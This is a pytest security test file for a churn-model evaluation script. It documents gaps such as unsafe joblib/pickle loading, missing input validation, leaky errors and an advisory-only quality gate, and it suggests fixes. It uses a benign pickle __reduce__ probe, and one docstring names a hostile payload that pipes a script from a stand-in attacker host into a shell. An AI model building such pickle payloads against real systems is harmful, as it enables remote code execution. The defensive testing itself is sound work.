"""Security-focused tests for src/churn/evaluate.py

Test groups by security category:

  [SEC-INJECT]    joblib.load() deserializes arbitrary Python objects via pickle;
                  a crafted model file can execute arbitrary OS commands at load time.
                  No class allowlist, HMAC, or digital-signature check is in place.
  [SEC-TYPE]      Missing type guards: wrong-typed params (string/None threshold)
                  cause internal TypeError / ValueError instead of a controlled error.
  [SEC-INFOLEAKW] KeyError messages expose the params.yaml schema and CSV column names
                  to the caller.
  [SEC-SILENT]    Silent failures: (1) the F1 quality gate only logs a warning --
                  a degraded model is never blocked from promotion;
                  (2) NaN in ground truth or model output propagates undetected.
  [SEC-THRESHOLD] Degenerate threshold values (0.0, 1.0, negative) produce
                  all-positive or all-negative predictions with no validation error.
  [SEC-DOS]       No size limit on the validation CSV; a crafted file can exhaust
                  process memory.
  [SEC-PATH]      config.METRICS_PATH is used with no project-boundary check.

Run:
    pytest tests/churn/test_evaluate_security.py -v

CURRENT BEHAVIOUR / EXPECTED BEHAVIOUR annotations mark places where the current
code does NOT yet implement secure handling. Those tests pass while documenting
a confirmed security gap; fixing the gap requires modifying the source, which is
out of scope here.

Security hardening suggestions
-------------------------------
joblib.load():
  - Verify the model file's HMAC or digital signature before deserializing:
      expected_hash = (MODEL_PATH.parent / "model.sha256").read_text().strip()
      if sha256(MODEL_PATH.read_bytes()) != expected_hash:
          raise ValueError("Model integrity check failed -- refusing to load")
  - Use a RestrictedUnpickler that allowlists safe classes:
      SAFE_CLASSES = {("sklearn.pipeline", "Pipeline"), ...}

params validation in main():
  - Add explicit type/presence guards before any key access:
      if not isinstance(params, dict):
          raise TypeError("load_params() must return a dict")
      if "evaluate" not in params:
          raise KeyError("params.yaml is missing required key 'evaluate'")
      threshold = params["evaluate"]["threshold"]
      if not isinstance(threshold, (int, float)) or not (0.0 <= threshold <= 1.0):
          raise ValueError(f"threshold must be a float in [0, 1], got {threshold!r}")

Quality gate:
  - Replace the log.warning with a hard failure to enforce the model quality contract:
      if metrics["f1"] < evaluate_params["min_f1"]:
          raise ValueError(
              f"Model rejected: F1 {metrics['f1']:.4f} < min_f1 gate {evaluate_params['min_f1']:.4f}"
          )

CSV / data validation:
  - Verify that the validation CSV contains the expected target column before scoring:
      if target not in valid_df.columns:
          raise ValueError(f"Target column not found in validation CSV")
  - Check for NaN values in y before computing metrics.
  - Enforce a maximum row count to prevent OOM:
      if len(valid_df) > MAX_VALID_ROWS:
          raise ValueError(f"Validation set too large: {len(valid_df)} rows")
"""
from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import joblib
import numpy as np
from numpy._typing._array_like import NDArray
import pandas as pd
import pytest

from src.churn import config
from src.churn.evaluate import main


# ---------------------------------------------------------------------------
# Pickle code-execution probe (module-level so it is importable by pickle)
# ---------------------------------------------------------------------------

_PROBE_REGISTRY: list[str] = []


def _probe_callback() -> None:
    """Appended to _PROBE_REGISTRY when the pickled reduction is called at load time."""
    _PROBE_REGISTRY.append("joblib_load_executed_code")


class _PickleCodeProbe:
    """Benign stand-in for a malicious pickle payload.

    __reduce__ stores (_probe_callback, ()) in the serialised bytes.
    When joblib.load() deserialises the file it calls _probe_callback(),
    demonstrating the arbitrary-code-execution vector.
    """

    def __reduce__(self) -> tuple[Any, Any]:
        return (_probe_callback, ())


# ---------------------------------------------------------------------------
# Helper class returned by the main_env fixture
# ---------------------------------------------------------------------------


class _MainEnv:
    def __init__(
        self,
        csv_path: Path,
        metrics_path: Path,
        model_path: Path,
        base_params: dict[str, Any],
        mock_pipe: MagicMock,
    ) -> None:
        self.csv_path: Path = csv_path
        self.metrics_path: Path = metrics_path
        self.model_path: Path = model_path
        self.base_params: dict[str, Any] = base_params
        self.mock_pipe: MagicMock = mock_pipe

    def run(self, params: dict[str, Any] | None = None, pipe: Any = None) -> None:
        _params: dict[str, Any] = params if params is not None else self.base_params
        _pipe: Any | MagicMock = pipe if pipe is not None else self.mock_pipe
        with patch("src.churn.evaluate.config.load_params", return_value=_params), \
                patch("src.churn.evaluate.joblib.load", return_value=_pipe):
            main()

    def load_metrics(self) -> dict[str, Any]:
        return json.loads(self.metrics_path.read_text())


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def base_params() -> dict[str, Any]:
    """Minimal valid params dict -- mirrors the prepare/evaluate sections of params.yaml."""
    return {
        "seed": 42,
        "prepare": {"target": "Churn"},
        "evaluate": {
            "threshold": 0.5,
            "min_f1": 0.3,
        },
    }


@pytest.fixture()
def valid_df() -> pd.DataFrame:
    """Six-row validation DataFrame with binary Churn target (0/1 integers)."""
    return pd.DataFrame({
        "MonthlyCharges": [29.85, 56.95, 53.85, 42.30, 65.0, 30.0],
        "Tenure": [1, 12, 24, 6, 36, 48],
        "Churn": [1, 0, 1, 0, 1, 0],
    })


@pytest.fixture()
def mock_pipe() -> MagicMock:
    """Mock sklearn Pipeline: predict_proba produces well-separated scores for 6 rows."""
    mock = MagicMock()
    # Rows 0,2,4 are churners (y=1) → high positive-class probability.
    # Rows 1,3,5 are non-churners (y=0) → low positive-class probability.
    _proba_6: NDArray[Any] = np.array([
        [0.20, 0.80],
        [0.80, 0.20],
        [0.30, 0.70],
        [0.75, 0.25],
        [0.25, 0.75],
        [0.70, 0.30],
    ])
    mock.predict_proba.return_value = _proba_6
    return mock


@pytest.fixture()
def main_env(
    tmp_path: Path,
    base_params: dict[str, Any],
    valid_df: pd.DataFrame,
    mock_pipe: MagicMock,
    monkeypatch: pytest.MonkeyPatch,
) -> _MainEnv:
    """Wire up filesystem paths and return a _MainEnv helper for calling main()."""
    csv_path: Path = tmp_path / "valid.csv"
    valid_df.to_csv(csv_path, index=False)
    metrics_path: Path = tmp_path / "metrics.json"

    monkeypatch.setattr(config, "VALID_CSV", csv_path)
    monkeypatch.setattr(config, "METRICS_PATH", metrics_path)
    monkeypatch.setattr(config, "MODEL_PATH", tmp_path / "model.joblib")

    return _MainEnv(csv_path, metrics_path, tmp_path / "model.joblib", base_params, mock_pipe)


# ===========================================================================
# 1. Normal operation (positive tests)
# ===========================================================================


class TestMainNormalOperation:
    """Pin the expected contract -- if these fail, a security fix has broken existing logic."""

    def test_metrics_file_is_created(self, main_env: _MainEnv):
        # Normal operation: a metrics.json file must be created after main() runs.
        main_env.run()
        assert main_env.metrics_path.exists()

    def test_all_expected_metric_keys_present(self, main_env: _MainEnv):
        # Normal operation: all declared metrics must be present in the output file.
        main_env.run()
        metrics: dict[str, Any] = main_env.load_metrics()
        for key in ("accuracy", "precision", "recall", "f1", "roc_auc", "n_valid", "positive_rate"):
            assert key in metrics, f"Expected metric key '{key}' is missing from metrics.json."

    def test_metric_values_in_valid_range(self, main_env: _MainEnv):
        # Normal operation: score metrics must be floats in [0, 1].
        main_env.run()
        metrics: dict[str, Any] = main_env.load_metrics()
        for key in ("accuracy", "precision", "recall", "f1", "roc_auc", "positive_rate"):
            assert 0.0 <= metrics[key] <= 1.0, (
                f"Metric '{key}' = {metrics[key]} is outside [0, 1]."
            )

    def test_n_valid_equals_validation_row_count(self, main_env: _MainEnv):
        # Normal operation: n_valid must match the number of rows in the validation CSV.
        main_env.run()
        metrics: dict[str, Any] = main_env.load_metrics()
        assert metrics["n_valid"] == 6

    def test_positive_rate_matches_mean_of_target(self, main_env: _MainEnv):
        # Normal operation: positive_rate must equal y.mean() (fraction of churners).
        main_env.run()
        metrics: dict[str, Any] = main_env.load_metrics()
        expected: float = round(3 / 6, 4)  # 3 churners out of 6 rows
        assert metrics["positive_rate"] == expected


# ===========================================================================
# 2. Pickle / joblib deserialization  [SEC-INJECT]
# ===========================================================================


class TestMainPickleInjection:
    """
    joblib.load() is built on pickle. There is no class allowlist, HMAC check,
    or digital signature verification in evaluate.py.

    CURRENT BEHAVIOUR: any serialised Python object is loaded and used.
    EXPECTED BEHAVIOUR: (1) verify the model file's integrity hash before loading;
                        (2) use a RestrictedUnpickler that rejects non-Pipeline objects.
    """

    def test_malicious_reduce_executes_during_joblib_load(self, tmp_path: Path):
        """
        [SEC-INJECT] CRITICAL SECURITY GAP

        pickle's __reduce__ protocol stores a callable tuple in the serialised bytes.
        When joblib.load() deserialises the file it calls that callable -- BEFORE
        evaluate.py receives the returned object, before any type check can run.

        A real attack would embed (os.system, ("curl attacker.com | sh",)) or
        (subprocess.Popen, (["id"],)). This test uses a benign probe to confirm
        the mechanism without causing harm.

        CURRENT BEHAVIOUR: _probe_callback fires during joblib.load() (assertion PASSES).
        EXPECTED BEHAVIOUR: verify the file's HMAC / signature before joblib.load().
        """
        _PROBE_REGISTRY.clear()
        model_path: Path = tmp_path / "malicious_model.joblib"
        joblib.dump(_PickleCodeProbe(), model_path)
        # __reduce__ runs during dump but does NOT call _probe_callback yet.
        _PROBE_REGISTRY.clear()

        joblib.load(model_path)  # The reduction tuple is called HERE.

        assert "joblib_load_executed_code" in _PROBE_REGISTRY, (
            "SECURITY GAP CONFIRMED: _probe_callback was invoked during joblib.load(). "
            "A real attack embeds os.system() instead, achieving arbitrary code execution. "
            "Fix: verify the model file's HMAC before loading, or restrict "
            "deserialisable classes with a custom Unpickler."
        )

    def test_no_type_check_on_loaded_model_object(self, main_env: _MainEnv):
        """
        [SEC-INJECT] SECURITY GAP

        evaluate.py never checks isinstance(pipe, Pipeline). Any object that
        exposes a predict_proba() method (or even one that raises AttributeError)
        is accepted. An attacker's payload that passes the predict_proba() call
        can stay undetected until metrics are computed.

        CURRENT BEHAVIOUR: arbitrary object accepted without type validation.
        EXPECTED BEHAVIOUR: assert isinstance(pipe, Pipeline) after joblib.load().
        """
        arbitrary_obj = MagicMock()
        arbitrary_obj.predict_proba.return_value = np.array([
            [0.3, 0.7], [0.8, 0.2], [0.4, 0.6], [0.7, 0.3], [0.35, 0.65], [0.6, 0.4],
        ])
        main_env.run(pipe=arbitrary_obj)
        assert main_env.metrics_path.exists(), (
            "SECURITY GAP CONFIRMED: an arbitrary non-Pipeline object was accepted "
            "by evaluate.py with no isinstance() check against sklearn.pipeline.Pipeline."
        )

    def test_non_pickle_file_raises_on_joblib_load(self, tmp_path: Path):
        # [SEC-INJECT] A file that is not a valid pickle must cause joblib.load() to raise.
        # This documents that basic format validation IS enforced by joblib (correct behaviour).
        corrupt: Path = tmp_path / "corrupt_model.joblib"
        corrupt.write_bytes(b"\x00NOT_A_PICKLE\xff\xfe")
        with pytest.raises(Exception):
            joblib.load(corrupt)

    def test_wrong_proba_shape_causes_unhandled_indexerror(self, main_env: _MainEnv):
        """
        [SEC-INJECT / SEC-TYPE] SECURITY GAP

        pipe.predict_proba(X)[:, 1] assumes a 2-column output (binary classifier).
        A malicious or misconfigured model that returns a 1-column array causes
        IndexError: index 1 is out of bounds for axis 1 with size 1.
        There is no shape guard before the column slice.

        CURRENT BEHAVIOUR: IndexError propagates to the caller (assertion PASSES).
        EXPECTED BEHAVIOUR: validate proba.shape[1] == 2 and raise ValueError with
                            a controlled message before column indexing.
        """
        bad_shape_pipe = MagicMock()
        bad_shape_pipe.predict_proba.return_value = np.array([[0.5], [0.5], [0.5],
                                                              [0.5], [0.5], [0.5]])
        with pytest.raises(IndexError):
            main_env.run(pipe=bad_shape_pipe)


# ===========================================================================
# 3. Params type safety and information leakage  [SEC-TYPE, SEC-INFOLEAKW]
# ===========================================================================


class TestMainParamsSecurity:
    """
    main() has no type guards on params; missing or wrong-typed keys cause internal
    KeyError / TypeError messages that expose the params schema to the caller.

    CURRENT BEHAVIOUR: raw KeyError / TypeError with key names in the message.
    EXPECTED BEHAVIOUR: validate params structure at entry and raise controlled
                        ValueError messages that do not expose internal key names.
    """

    def test_missing_evaluate_section_leaks_key_in_keyerror(self, main_env: _MainEnv):
        """
        [SEC-INFOLEAKW] params["evaluate"] raises KeyError('evaluate') if the key
        is absent, exposing the exact key name to the caller.
        """
        params_no_eval: dict[str, Any] = {**main_env.base_params}
        del params_no_eval["evaluate"]
        with pytest.raises(KeyError) as exc_info:
            main_env.run(params=params_no_eval)
        assert "evaluate" in str(exc_info.value), (
            "SECURITY GAP CONFIRMED: the KeyError message exposes the internal "
            "key name 'evaluate', leaking the params.yaml schema to the caller."
        )

    def test_missing_prepare_section_leaks_key_in_keyerror(self, main_env: _MainEnv):
        """
        [SEC-INFOLEAKW] params["prepare"]["target"] raises KeyError('prepare') if
        the prepare section is absent.
        """
        params_no_prepare: dict[str, Any] = {**main_env.base_params}
        del params_no_prepare["prepare"]
        with pytest.raises(KeyError) as exc_info:
            main_env.run(params=params_no_prepare)
        assert "prepare" in str(exc_info.value), (
            "SECURITY GAP CONFIRMED: the KeyError message exposes the internal "
            "key name 'prepare', leaking the params.yaml schema to the caller."
        )

    def test_missing_threshold_key_leaks_key_in_keyerror(self, main_env: _MainEnv):
        """
        [SEC-INFOLEAKW] evaluate_params["threshold"] raises KeyError('threshold')
        if the key is absent.
        """
        import copy
        params_no_thr: dict[str, Any] = copy.deepcopy(main_env.base_params)
        del params_no_thr["evaluate"]["threshold"]
        with pytest.raises(KeyError) as exc_info:
            main_env.run(params=params_no_thr)
        assert "threshold" in str(exc_info.value), (
            "SECURITY GAP CONFIRMED: the KeyError message exposes the internal "
            "key name 'threshold', leaking the params.yaml schema."
        )

    def test_string_threshold_causes_type_error(self, main_env: _MainEnv):
        """
        [SEC-TYPE] SECURITY GAP

        threshold is used in `proba >= threshold`. A string threshold ("0.5" instead
        of 0.5) causes a TypeError in the comparison with no prior validation.

        CURRENT BEHAVIOUR: TypeError from numpy comparison (assertion PASSES).
        EXPECTED BEHAVIOUR: explicit type guard raises ValueError("threshold must be
                            a float in [0, 1]") before any proba comparison.
        """
        import copy
        params_str_thr: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_str_thr["evaluate"]["threshold"] = "0.5"
        with pytest.raises((TypeError, ValueError)):
            main_env.run(params=params_str_thr)

    def test_none_threshold_causes_type_error(self, main_env: _MainEnv):
        """
        [SEC-TYPE] SECURITY GAP

        None threshold causes `proba >= None` which raises TypeError from numpy.
        There is no explicit None check before the comparison.

        CURRENT BEHAVIOUR: TypeError from numpy (assertion PASSES).
        EXPECTED BEHAVIOUR: explicit guard raises ValueError before any comparison.
        """
        import copy
        params_none_thr: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_none_thr["evaluate"]["threshold"] = None
        with pytest.raises((TypeError, ValueError)):
            main_env.run(params=params_none_thr)

    def test_none_params_causes_unhelpful_type_error(
        self, main_env: _MainEnv
    ):
        """
        [SEC-SILENT] SECURITY GAP

        If load_params() returns None (empty params.yaml -- see [SEC-SILENT] in
        test_config_security.py), then params["prepare"] raises:
            TypeError: 'NoneType' object is not subscriptable

        The error gives no indication that params.yaml was empty.

        CURRENT BEHAVIOUR: unhelpful TypeError propagates (assertion PASSES).
        EXPECTED BEHAVIOUR: validate isinstance(params, dict) at the top of main()
                            and raise ValueError("load_params() returned None --
                            is params.yaml empty?").
        """
        # Bypass _MainEnv.run() so we can inject None as the actual params value.
        with pytest.raises(TypeError):
            with patch("src.churn.evaluate.config.load_params", return_value=None), \
                    patch("src.churn.evaluate.joblib.load", return_value=main_env.mock_pipe):
                main()


# ===========================================================================
# 4. Validation data security  [SEC-TYPE, SEC-INFOLEAKW, SEC-SILENT, SEC-DOS]
# ===========================================================================


class TestMainDataSecurity:
    """
    main() has no guards on the validation CSV's content.
    """

    def test_missing_target_column_leaks_column_name_in_keyerror(
        self, tmp_path: Path, base_params: dict[str, Any], mock_pipe: MagicMock, monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-INFOLEAKW] SECURITY GAP

        If the validation CSV does not contain the target column, pandas raises
            KeyError: "['Churn'] not found in axis"
        The column name is embedded in the error message.

        CURRENT BEHAVIOUR: column name exposed in KeyError (assertion PASSES).
        EXPECTED BEHAVIOUR: check `target in valid_df.columns` and raise
                            ValueError("target column not found") without leaking
                            the column name.
        """
        csv_no_target: Path = tmp_path / "no_target.csv"
        pd.DataFrame({"MonthlyCharges": [1.0, 2.0], "Tenure": [1, 2]}).to_csv(
            csv_no_target, index=False
        )
        metrics_path: Path = tmp_path / "metrics.json"
        monkeypatch.setattr(config, "VALID_CSV", csv_no_target)
        monkeypatch.setattr(config, "METRICS_PATH", metrics_path)

        with pytest.raises(KeyError) as exc_info:
            with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                    patch("src.churn.evaluate.joblib.load", return_value=mock_pipe):
                main()
        assert "Churn" in str(exc_info.value), (
            "SECURITY GAP CONFIRMED: the column name 'Churn' appears in the KeyError "
            "message, leaking the data schema to the caller."
        )

    def test_single_class_labels_write_nan_roc_auc_silently(
        self, tmp_path: Path, base_params: dict[str, Any], monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-SILENT] SECURITY GAP

        sklearn >= 1.4 changed roc_auc_score to emit UndefinedMetricWarning and
        return float('nan') when only one class is present in y_true, instead of
        raising ValueError. evaluate.py does not intercept this warning.

        As a result, main() completes without raising, and the metrics file contains
        `NaN` for roc_auc -- which is not valid JSON and silently corrupts any
        downstream consumer that parses metrics.json.

        CURRENT BEHAVIOUR: NaN written to metrics.json, no exception (assertion PASSES).
        EXPECTED BEHAVIOUR: check len(np.unique(y)) >= 2 before calling roc_auc_score
                            and raise ValueError("validation set contains only one class").
        """
        import math

        single_class_csv: Path = tmp_path / "single_class.csv"
        pd.DataFrame({"MonthlyCharges": [1.0, 2.0, 3.0, 4.0], "Churn": [0, 0, 0, 0]}).to_csv(
            single_class_csv, index=False
        )
        metrics_path: Path = tmp_path / "metrics.json"
        monkeypatch.setattr(config, "VALID_CSV", single_class_csv)
        monkeypatch.setattr(config, "METRICS_PATH", metrics_path)

        single_class_pipe = MagicMock()
        single_class_pipe.predict_proba.return_value = np.array(
            [[0.7, 0.3], [0.8, 0.2], [0.6, 0.4], [0.9, 0.1]]
        )
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")  # Suppress UndefinedMetricWarning for test clarity
            with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                    patch("src.churn.evaluate.joblib.load", return_value=single_class_pipe):
                main()  # Must NOT raise

        raw: str = metrics_path.read_text()
        # Python's json module writes NaN as the bare token NaN (invalid JSON)
        assert "NaN" in raw or "nan" in raw or \
            math.isnan(json.loads(raw.replace("NaN", "null"))["roc_auc"] or float("nan")), (
                "SECURITY GAP CONFIRMED: single-class validation set caused roc_auc=NaN "
                "to be written to metrics.json silently. "
                "Fix: assert len(np.unique(y)) >= 2 before calling roc_auc_score."
            )

    def test_nan_in_target_column_causes_metric_error(
        self, tmp_path: Path, base_params: dict[str, Any], monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-SILENT] SECURITY GAP

        A validation CSV with NaN in the target column (e.g. from a malformed prepare
        output) causes sklearn metric functions to fail or produce undefined results.
        There is no NaN check on y before metrics are computed.

        CURRENT BEHAVIOUR: ValueError / TypeError from sklearn (assertion PASSES).
        EXPECTED BEHAVIOUR: check for NaN in y and raise ValueError with a message
                            that does not expose the column name or schema.
        """
        nan_csv: Path = tmp_path / "nan_target.csv"
        pd.DataFrame({
            "MonthlyCharges": [1.0, 2.0, 3.0],
            "Churn": [1.0, float("nan"), 0.0],
        }).to_csv(nan_csv, index=False)
        metrics_path: Path = tmp_path / "metrics.json"
        monkeypatch.setattr(config, "VALID_CSV", nan_csv)
        monkeypatch.setattr(config, "METRICS_PATH", metrics_path)

        three_row_pipe = MagicMock()
        three_row_pipe.predict_proba.return_value = np.array(
            [[0.3, 0.7], [0.5, 0.5], [0.8, 0.2]]
        )
        with pytest.raises((ValueError, TypeError)):
            with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                    patch("src.churn.evaluate.joblib.load", return_value=three_row_pipe):
                main()

    def test_empty_validation_csv_causes_metric_error(
        self, tmp_path: Path, base_params: dict[str, Any], monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-SILENT] SECURITY GAP

        An empty validation CSV (headers only, zero rows) causes sklearn metric
        functions to receive empty arrays and raise ValueError or produce NaN.
        There is no row-count guard before metrics are computed.

        CURRENT BEHAVIOUR: ValueError from sklearn (assertion PASSES).
        EXPECTED BEHAVIOUR: check len(valid_df) == 0 and raise ValueError
                            ("validation set is empty") before calling any metric.
        """
        empty_csv: Path = tmp_path / "empty.csv"
        pd.DataFrame({
            "MonthlyCharges": pd.Series(dtype=float),
            "Churn": pd.Series(dtype=int),
        }).to_csv(empty_csv, index=False)
        metrics_path: Path = tmp_path / "metrics.json"
        monkeypatch.setattr(config, "VALID_CSV", empty_csv)
        monkeypatch.setattr(config, "METRICS_PATH", metrics_path)

        empty_pipe = MagicMock()
        empty_pipe.predict_proba.side_effect = \
            lambda X: np.empty((len(X), 2))  # pyright: ignore[reportUnknownLambdaType]
        with pytest.raises((ValueError, ZeroDivisionError)):
            with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                    patch("src.churn.evaluate.joblib.load", return_value=empty_pipe):
                main()

    def test_large_validation_csv_accepted_without_size_guard(
        self, tmp_path: Path, base_params: dict[str, Any], monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-DOS] SECURITY GAP

        There is no maximum-row-count guard on the validation CSV.  A crafted file
        with millions of rows can exhaust process memory. This test writes 50 000
        rows to document the absence of a size guard without causing real harm.

        CURRENT BEHAVIOUR: large CSV is read and processed (assertion PASSES).
        EXPECTED BEHAVIOUR: raise ValueError if len(valid_df) > MAX_VALID_ROWS.
        """
        n = 50_000
        large_csv: Path = tmp_path / "large.csv"
        pd.DataFrame({
            "MonthlyCharges": np.random.default_rng(0).uniform(20, 100, n),
            "Churn": np.tile([1, 0], n // 2),
        }).to_csv(large_csv, index=False)
        metrics_path: Path = tmp_path / "metrics.json"
        monkeypatch.setattr(config, "VALID_CSV", large_csv)
        monkeypatch.setattr(config, "METRICS_PATH", metrics_path)

        large_pipe = MagicMock()
        large_pipe.predict_proba.side_effect = lambda X: np.column_stack([  # pyright: ignore[reportUnknownLambdaType]
            np.full(len(X), 0.4), np.full(len(X), 0.6),
        ])
        start: float = time.monotonic()
        with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                patch("src.churn.evaluate.joblib.load", return_value=large_pipe):
            main()
        elapsed: float = time.monotonic() - start
        assert metrics_path.exists(), (
            f"SECURITY GAP CONFIRMED: {n:,}-row validation CSV was accepted and "
            f"processed in {elapsed:.2f}s with no size guard. "
            "Fix: enforce a configurable MAX_VALID_ROWS limit."
        )


# ===========================================================================
# 5. Quality gate security  [SEC-SILENT, SEC-THRESHOLD]
# ===========================================================================


class TestMainQualityGate:
    """
    The F1 quality gate is advisory only: it logs a warning but does NOT raise,
    allowing a degraded model to be promoted to serving.
    Degenerate threshold values produce pathological prediction distributions
    without triggering any validation error.
    """

    def test_f1_below_min_f1_only_logs_warning_not_raises(self, main_env: _MainEnv):
        """
        [SEC-SILENT] CRITICAL SECURITY GAP

        The quality gate code reads:
            if metrics["f1"] < evaluate_params["min_f1"]:
                log.warning("F1 ... is BELOW the gate ...")

        A model whose F1 is below the declared minimum is never rejected --
        the pipeline completes successfully, and the model can be deployed.
        An attacker who injects a degraded model or a crafted validation set
        can pass the gate with only a warning in a log that may go unread.

        CURRENT BEHAVIOUR: main() returns normally, warning is logged, no exception
                           (assertion PASSES, documenting the gap).
        EXPECTED BEHAVIOUR: raise ValueError("Model rejected: F1 below gate") so the
                            DVC stage exits with a non-zero status and blocks promotion.
        """
        import copy
        params_strict: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_strict["evaluate"]["min_f1"] = 1.1  # Impossible to satisfy

        # main() must NOT raise even though f1 < min_f1 = 1.1
        try:
            main_env.run(params=params_strict)
        except Exception as exc:
            pytest.fail(
                f"SECURITY GAP BROKEN: main() raised {type(exc).__name__} when f1 < min_f1, "
                f"but the gate is supposed to be advisory-only. "
                f"If this is now a hard failure, the gap has been fixed -- update the test."
            )
        assert main_env.metrics_path.exists(), (
            "SECURITY GAP CONFIRMED: main() completed without raising even though "
            "f1 < min_f1 (quality gate is advisory only). "
            "Fix: replace log.warning with 'raise ValueError(...)' to block promotion."
        )

    def test_threshold_zero_produces_all_positive_predictions_silently(
        self, main_env: _MainEnv
    ):
        """
        [SEC-THRESHOLD] SECURITY GAP

        threshold=0.0 causes `proba >= 0.0` to be True for every sample,
        producing 100% positive predictions. This gives a recall of 1.0 but
        may inflate the F1 score well above a real performance baseline.
        No boundary check prevents threshold=0.0 from being set.

        CURRENT BEHAVIOUR: all-positive predictions accepted silently (assertion PASSES).
        EXPECTED BEHAVIOUR: validate 0.0 < threshold < 1.0 (exclusive) and raise
                            ValueError if the threshold is at a degenerate boundary.
        """
        import copy
        params_thr0: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_thr0["evaluate"]["threshold"] = 0.0

        main_env.run(params=params_thr0)
        metrics: dict[str, Any] = main_env.load_metrics()
        assert metrics["recall"] == 1.0, (
            "SECURITY GAP CONFIRMED: threshold=0.0 produces recall=1.0 "
            "(all samples predicted positive) with no validation error."
        )

    def test_threshold_one_produces_all_negative_predictions_silently(
        self, main_env: _MainEnv
    ):
        """
        [SEC-THRESHOLD] SECURITY GAP

        threshold=1.0 causes `proba >= 1.0` to be False for every sample
        (no probability can reach exactly 1.0), producing all-zero predictions.
        This drives F1 to 0.0, which would breach the quality gate, but the gate
        only logs a warning and does not block promotion.

        CURRENT BEHAVIOUR: all-negative predictions accepted silently (assertion PASSES).
        EXPECTED BEHAVIOUR: validate threshold < 1.0 and raise ValueError.
        """
        import copy
        params_thr1: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_thr1["evaluate"]["threshold"] = 1.0

        main_env.run(params=params_thr1)
        metrics: dict[str, Any] = main_env.load_metrics()
        assert metrics["recall"] == 0.0, (
            "SECURITY GAP CONFIRMED: threshold=1.0 produces recall=0.0 "
            "(all samples predicted negative) with no validation error."
        )

    def test_negative_threshold_accepted_silently(self, main_env: _MainEnv):
        """
        [SEC-THRESHOLD] SECURITY GAP

        A negative threshold (e.g. -1.0) makes `proba >= -1.0` True for all rows,
        behaving identically to threshold=0.0. No range check prevents this.

        CURRENT BEHAVIOUR: negative threshold accepted without raising (assertion PASSES).
        EXPECTED BEHAVIOUR: validate threshold >= 0.0 and raise ValueError.
        """
        import copy
        params_neg: dict[str, Any] = copy.deepcopy(main_env.base_params)
        params_neg["evaluate"]["threshold"] = -1.0

        main_env.run(params=params_neg)
        metrics: dict[str, Any] = main_env.load_metrics()
        # A negative threshold is equivalent to threshold=0 -- all predictions are positive.
        assert metrics["recall"] == 1.0, (
            "SECURITY GAP CONFIRMED: threshold=-1.0 accepted without validation. "
            "Fix: assert 0.0 <= threshold <= 1.0 at the top of main()."
        )


# ===========================================================================
# 6. Path security  [SEC-PATH]
# ===========================================================================


class TestMainPathSecurity:
    """
    evaluate.py uses config.MODEL_PATH and config.VALID_CSV without validating
    that they exist or are within the project root.
    """

    def test_missing_model_file_raises(
        self, tmp_path: Path, base_params: dict[str, Any], valid_df: pd.DataFrame, monkeypatch: pytest.MonkeyPatch
    ):
        # [SEC-PATH] A missing model file must cause an explicit error, not a silent skip.
        csv_path: Path = tmp_path / "valid.csv"
        valid_df.to_csv(csv_path, index=False)
        monkeypatch.setattr(config, "VALID_CSV", csv_path)
        monkeypatch.setattr(config, "METRICS_PATH", tmp_path / "metrics.json")
        monkeypatch.setattr(config, "MODEL_PATH", tmp_path / "no_such_model.joblib")

        with pytest.raises(Exception):  # FileNotFoundError or joblib-specific error
            with patch("src.churn.evaluate.config.load_params", return_value=base_params):
                main()  # joblib.load is NOT patched -- it will attempt the real load

    def test_missing_valid_csv_raises(
        self, tmp_path: Path, base_params: dict[str, Any], mock_pipe: MagicMock, monkeypatch: pytest.MonkeyPatch
    ):
        # [SEC-PATH] A missing validation CSV must raise FileNotFoundError.
        monkeypatch.setattr(config, "VALID_CSV", tmp_path / "no_such_valid.csv")
        monkeypatch.setattr(config, "METRICS_PATH", tmp_path / "metrics.json")

        with pytest.raises(FileNotFoundError):
            with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                    patch("src.churn.evaluate.joblib.load", return_value=mock_pipe):
                main()

    def test_metrics_written_to_arbitrary_path_outside_project(
        self, tmp_path: Path, base_params: dict[str, Any], valid_df: pd.DataFrame,
        mock_pipe: MagicMock, monkeypatch: pytest.MonkeyPatch
    ):
        """
        [SEC-PATH] SECURITY GAP

        config.write_json(config.METRICS_PATH, metrics) has no project-boundary check
        (documented in test_config_security.py). evaluate.py inherits this gap:
        METRICS_PATH can point anywhere the process has write access.

        CURRENT BEHAVIOUR: metrics file written outside the project root (assertion PASSES).
        EXPECTED BEHAVIOUR: validate METRICS_PATH is within PROJECT_ROOT before writing.
        """
        outside_path: Path = tmp_path / "outside_metrics.json"
        csv_path: Path = tmp_path / "valid.csv"
        valid_df.to_csv(csv_path, index=False)

        monkeypatch.setattr(config, "VALID_CSV", csv_path)
        monkeypatch.setattr(config, "METRICS_PATH", outside_path)
        monkeypatch.setattr(config, "MODEL_PATH", tmp_path / "model.joblib")

        with patch("src.churn.evaluate.config.load_params", return_value=base_params), \
                patch("src.churn.evaluate.joblib.load", return_value=mock_pipe):
            main()

        assert outside_path.exists(), (
            "SECURITY GAP CONFIRMED: evaluate.py wrote the metrics file to an "
            "arbitrary path outside the project root with no boundary check."
        )
